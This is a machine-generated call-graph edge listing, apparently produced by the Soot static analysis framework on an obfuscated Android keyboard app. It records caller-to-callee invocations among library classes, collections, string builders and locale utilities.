VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lkq: int hashCode()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid language \'%s\', fallback to \'en\'", $r0, $r4) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lwc: void <init>()>() in <lwe: void <init>()> ==> <lwc: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r4) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $r11 = staticinvoke <lma: lma p(java.util.Collection)>($r10) in <lmb: lme f()> ==> <lma: lma p(java.util.Collection)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lrg: int hashCode()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r5) in <ljf: boolean add(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: lma f()>() in <lkx: lma p()> ==> <lqq: lma f()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <ljb: java.lang.Object getKey()>
INTERFACE edge: $z1 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <liz: boolean hasNext()>
STATIC edge: $i5 = staticinvoke <izw: int af(int,int)>($i3, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int af(int,int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqs: lsa l()>
VIRTUAL edge: virtualinvoke r0.<nzh: void d()>() in <nzh: boolean f(ivv)> ==> <nzh: void d()>
VIRTUAL edge: virtualinvoke $r2.<j$.sun.misc.b: void l(java.lang.Object,long,java.lang.Object)>($r0, $l0, $r1) in <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)> ==> <j$.sun.misc.b: void l(java.lang.Object,long,java.lang.Object)>
STATIC edge: $i7 = staticinvoke <izw: int aj(java.lang.Object,int)>($r5, $i6) in <ljf: boolean add(java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <ljb: java.lang.Object getValue()>
STATIC edge: $z0 = staticinvoke <lma: boolean x(int,int)>($i0, $i1) in <lly: lma g()> ==> <lma: boolean x(int,int)>
CLINIT edge: staticinvoke <ltf: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltf: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int rotateLeft(int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lta: int hashCode()>
SPECIAL edge: specialinvoke $r0.<ltr: void <init>()>() in <ltr: void <clinit>()> ==> <ltr: void <init>()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i3, $i6) in <ljd: int z(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void u(int,java.lang.Object)>($i0, $r2) in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: void u(int,java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void p()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void p()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
STATIC edge: $r0 = staticinvoke <lth: lth i(java.lang.String)>("EntryStoreHelper") in <hnc: void <clinit>()> ==> <lth: lth i(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsb: void <init>(int,int)>($i1, $i0) in <lkm: void <init>(lkq,int)> ==> <lsb: void <init>(int,int)>
STATIC edge: $r1 = staticinvoke <luk: lum a(java.lang.String[])>($r0) in <luk: void <clinit>()> ==> <luk: lum a(java.lang.String[])>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iye: void I(boolean,java.lang.Object)>($z0, "Arrays already allocated") in <ljd: int b()> ==> <iye: void I(boolean,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
SPECIAL edge: specialinvoke $r8.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <lvr: void <init>(java.util.List)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r2 = staticinvoke <lvm: lum j()>() in <luk: lum a(java.lang.String[])> ==> <lvm: lum j()>
STATIC edge: $i3 = staticinvoke <izw: int af(int,int)>($i2, $i0) in <ljf: int o(int,int,int,int)> ==> <izw: int af(int,int)>
STATIC edge: $r4 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>($r1) in <hcb: void <init>()> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljf: int c()>() in <lje: void <init>(ljf)> ==> <ljf: int c()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljf: void l(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <ljf: java.util.Iterator iterator()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int numberOfLeadingZeros(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r9.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r7) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lqr: java.util.Iterator iterator()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lqr: lsa l()>() in <lqr: java.util.Iterator iterator()> ==> <lqr: lsa l()>
STATIC edge: $z0 = staticinvoke <iwt: boolean o(char)>($c0) in <ivw: boolean O(char)> ==> <iwt: boolean o(char)>
CLINIT edge: staticinvoke <iwt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <iwt: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lkq: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.ConcurrentHashMap: int hashCode()> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
STATIC edge: $i0 = staticinvoke <izw: int af(int,int)>($i0, $i1) in <ljd: int f(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke r0.<ljf: void q(int)>($i1) in <ljf: int b()> ==> <ljf: void q(int)>
SPECIAL edge: specialinvoke $r23.<jhe: void <init>(lak,lsr,int,byte[])>($r10, $r1, 20, null) in <lsd: boolean b(lsr)> ==> <jhe: void <init>(lak,lsr,int,byte[])>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.util.concurrent.atomic.AtomicLong: void set(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicLong: void set(long)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: java.lang.Object next()>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void c(java.lang.Object,java.lang.String)>($r3, "copyOf(this, newSize)") in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ojg: void c(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.NullPointerException: void <init>(java.lang.String)>($r2) in <ojg: void v(java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<ivw: java.lang.String p()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: java.lang.String p()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int d(int)>($i0) in <ljf: java.util.Set f()> ==> <ljf: int d(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Object: int hashCode()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lql: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r0, 0, $r0, 0, 0) in <lqr: void <clinit>()> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lqp: java.lang.Object get(int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lvr: boolean equals(java.lang.Object)>($r4) in <lvt: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void f(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void f(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: boolean d()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Throwable: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r19.<java.util.concurrent.atomic.AtomicInteger: int getAndSet(int)>(0) in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicInteger: int getAndSet(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object h(int)>($i2) in <ljd: int f(java.lang.Object)> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r6.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r2, $i0, $r1, $i1, $i2) in <lly: lma g()> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liy: int size()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqs: lsa l()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>($r2) in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>
SPECIAL edge: specialinvoke $r0.<lak: void <init>(byte[])>(null) in <lsu: void <clinit>()> ==> <lak: void <init>(byte[])>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("Uncategorized", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ing: void <init>(java.lang.String,iec)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r11 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r5, $i2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r7, $r8) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 253, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i0) in <izw: java.lang.Object al(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lid: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("] was already created.") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Multiple entries with same key: ") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<lmb: void <init>()>() in <lme: lmb g()> ==> <lmb: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hnp: void <init>()> ==> <iec: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lma: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: int hashCode()>
SPECIAL edge: specialinvoke $r6.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_TRENDING_METADATA", 6, 6) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<lvs: void <init>(java.lang.String,int)>("LONG", 2) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <lki: java.lang.Object getValue()>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r4, $i0, $r9) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r5.<lqk: void <init>(java.lang.Object[],int)>($r6, 3) in <ivw: void <clinit>()> ==> <lqk: void <init>(java.lang.Object[],int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: boolean hasNext()>
CLINIT edge: staticinvoke <java.lang.Long: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Long: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lje: boolean hasNext()>() in <lje: java.lang.Object next()> ==> <lje: boolean hasNext()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(axu,java.lang.Class,ldp)>($r20, class "Ljava/io/InputStream;", r0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(axu,java.lang.Class,ldp)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkq: lsb B()>() in <lqs: lsa l()> ==> <lkq: lsb B()>
STATIC edge: $i1 = staticinvoke <lkg: int a(int,int)>($i0, $i1) in <lkg: void g(int)> ==> <lkg: int a(int,int)>
STATIC edge: $i0 = staticinvoke <izw: int ad(java.lang.Object)>($r1) in <ljd: int f(java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
STATIC edge: $l0 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r0) in <ivw: boolean z(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i2, 3) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lsp: int hashCode()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("StickerImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: $r9 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsn: boolean b(lsr)>($r3) in <lsn: boolean ac()> ==> <lsd: boolean b(lsr)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>($r0, $r4) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.String: int length()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r3.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>($r5, $r0, $i0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r5.<java.util.Map$Entry: java.lang.Object getKey()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<java.lang.Class: java.lang.String getName()>() in <ojg: void h(java.lang.Throwable)> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lsz: boolean equals(java.lang.Object)>($r14) in <lsd: boolean b(lsr)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $l1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(3) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r22 = staticinvoke <bel: java.io.InputStream a(java.nio.ByteBuffer)>($r21) in <hbw: java.lang.Object a(java.lang.Object)> ==> <bel: java.io.InputStream a(java.nio.ByteBuffer)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "metadata value") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <lsb: void <init>(int,int)> ==> <lsa: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: $i0 = specialinvoke $r2.<lvr: int b()>() in <lvr: void <init>(lvr,lvr)> ==> <lvr: int b()>
SPECIAL edge: specialinvoke $r6.<java.util.NoSuchElementException: void <init>()>() in <j$.util.concurrent.d: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: int f(java.lang.Object)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqn: void <init>(lkx,java.lang.Object[],int,int)> ==> <lma: void <init>()>
STATIC edge: $r1 = staticinvoke <lme: lma l(java.util.Comparator)>(null) in <lme: void <init>(lkx,int)> ==> <lme: lma l(java.util.Comparator)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
